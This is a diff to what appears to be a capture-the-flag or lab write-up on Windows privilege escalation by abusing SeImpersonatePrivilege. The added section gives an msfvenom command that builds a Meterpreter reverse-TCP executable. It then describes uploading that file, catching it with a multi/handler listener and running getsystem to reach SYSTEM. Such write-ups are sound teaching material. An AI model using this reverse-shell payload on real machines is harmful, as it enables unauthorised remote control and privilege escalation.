@@ -39,8 +39,21 @@ I put the meterpreter session in the background on session 1, I tried to use loc
 ![Image Description](Uploads/suggester.png)
 
 User is not part of the "Administrators" group however there is a really interesting privilege assigned to the user, **SeImpersonatePrivilege** is a Windows privilege that grants a user or process the ability to impersonate the security context of another user or account, we can abuse of this privilege to impersonate SYSTEM user.
-![Link Text](https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/)
 
 ![Image Description](Uploads/enum.png)
 
 ![Image Description](Uploads/impersonate.png)
+
+In order to properly abuse to this privilege, I need to be able to obtain a meterpreter session with **windows/meterpreter/reverse_tcp** to execute **getsystem**. So, I decided to create a custom payload with msfvenom (this should have a different IP from our initial shell):
+
+```msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -f exe -o shell.exe
+```
+
+![Image Description](Uploads/msfvenom.png)
+
+I created a folder to upload **shell.exe** file, once uploaded, I opened a new Meterpreter terminal and I used **multi/handler**. I configured same IP and PORT from msfvenom and click run to start the listener. In my other sessions, I executed .\shell.exe
+
+![Image Description](Uploads/upload_shell.png)
+
+![Image Description](Uploads/meterpreter_shell.png)
